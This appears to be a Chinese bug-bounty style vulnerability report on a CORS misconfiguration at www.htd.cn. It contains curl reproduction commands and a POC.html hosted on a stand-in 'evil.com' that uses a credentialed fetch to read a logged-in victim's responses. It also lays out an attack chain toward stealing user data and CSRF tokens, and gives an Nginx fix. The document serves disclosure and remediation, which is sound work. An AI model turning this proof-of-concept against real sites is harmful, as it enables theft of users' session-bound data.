# 【漏洞详情 - 描述】
汇通达官网（www.htd.cn）的Nginx/网关层存在严重的CORS（跨域资源共享）配置缺陷：
- 服务器**直接反射用户提交的任意Origin值**到Access-Control-Allow-Origin响应头
- 同时硬编码了 **Access-Control-Allow-Credentials: true**（允许携带Cookie凭证）
- 经**3轮重复验证，5种恶意Origin**（null、evil.com、伪造子域、伪造尾域）**15/15全部命中**
- **全站6路径验证 6/6通过**（非局部缺陷，架构级配置问题）

当Origin为以下5种完全不受信任域名时，服务器均反射Origin并开启Credentials：
1. Origin: null → ACAO=null + ACAC:true ✅
2. Origin: http://evil.com → ACAO=http://evil.com + ACAC:true ✅
3. Origin: https://evil.com → ACAO=https://evil.com + ACAC:true ✅
4. Origin: https://htd.cn.evil.com → ACAO=https://htd.cn.evil.com + ACAC:true ✅
5. Origin: http://www.htd.cn.evil.com → ACAO=http://www.htd.cn.evil.com + ACAC:true ✅

（注：Origin=null 可通过`<iframe sandbox="allow-scripts allow-same-origin">`触发，绕过部分白名单逻辑）

# 【复现步骤】
## 【方案A：标准反射 - https://evil.com】
### 复现命令（一键验证）：
```bash
curl -sk -D - -o /dev/null -H "Origin: https://evil.com" "https://www.htd.cn/" | grep -iE "access-control|HTTP/"
```

### 预期关键响应头（漏洞成立证据）：
```
HTTP/2 200
access-control-allow-origin: https://evil.com     ← Origin被直接反射
access-control-allow-credentials: true            ← 允许携带Cookie
server: nginx
```

## 【方案B：null Origin（iframe sandbox绕过）】
```bash
curl -sk -D - -o /dev/null -H "Origin: null" "https://www.htd.cn/" | grep -iE "access-control"
```

### 响应头：
```
access-control-allow-origin: null
access-control-allow-credentials: true
```

# 【利用场景 - 实际危害演示（非破坏性）】
## POC.html（非破坏性读取测试）
攻击者在 evil.com 部署如下页面：
```html
<script>
  // 受害者访问evil.com时，JS自动携带汇通达Cookie跨域请求
  fetch("https://www.htd.cn/", {
    method: "GET",
    credentials: "include",     // 携带汇通达Cookie
    mode: "cors"
  }).then(response => response.text()).then(html => {
    // 由于ACAO反射evil.com+Credentials:true，同源策略被绕过
    // html变量 = www.htd.cn/的完整HTML响应（含用户特定数据）
    console.log("读取到的汇通达响应长度:", html.length);
  });
</script>
```

**危害链**：
1. 受害者已登录汇通达（存有会话Cookie）
2. 受害者访问 evil.com（或被嵌入广告的任意网站）
3. 浏览器自动携带汇通达Cookie → 跨域请求 www.htd.cn
4. 因配置缺陷，浏览器允许evil.com JS**读取完整响应**
5. 攻击者可读取：用户数据页、CSRF Token、内部API返回、个性化内容等敏感数据

---

# 【危害影响】
1. **数据泄露**：可跨域读取用户特定页面（账号信息、订单、个人资料），大规模用户数据泄露风险
2. **CSRF升级**：读取到内部CSRF Token后，可将原本无法读响应的CSRF升级为"读+写"的完全越权
3. **全站受影响**：不是某个页面的问题，而是所有路径均受影响，包括静态资源和业务接口
4. **null Origin风险**：配合iframe sandbox构造，可在邮箱、第三方应用内触发利用

# 【修复建议（Nginx可直接套用）】
## 错误配置（当前）：
```nginx
# 错误：直接反射任意Origin
add_header Access-Control-Allow-Origin $http_origin always;
add_header Access-Control-Allow-Credentials true always;
```

## 正确配置（严格白名单）：
```nginx
map $http_origin $cors_origin {
    default "";
    # 白名单：精确匹配汇通达官方域名
    "~^https?://(www\.)?htd\.cn$"                    $http_origin;
    "~^https?://([a-zA-Z0-9\-]+\.)?htd\.cn$"        $http_origin;
}

server {
    # 仅当白名单匹配时才下发CORS头，$cors_origin=空则不下发
    add_header Access-Control-Allow-Origin      $cors_origin always;
    add_header Access-Control-Allow-Credentials  "true"        always;
    add_header Access-Control-Allow-Methods      "GET, POST, PUT, DELETE, OPTIONS" always;
    add_header Vary "Origin";   # 避免CDN缓存混淆
}
```
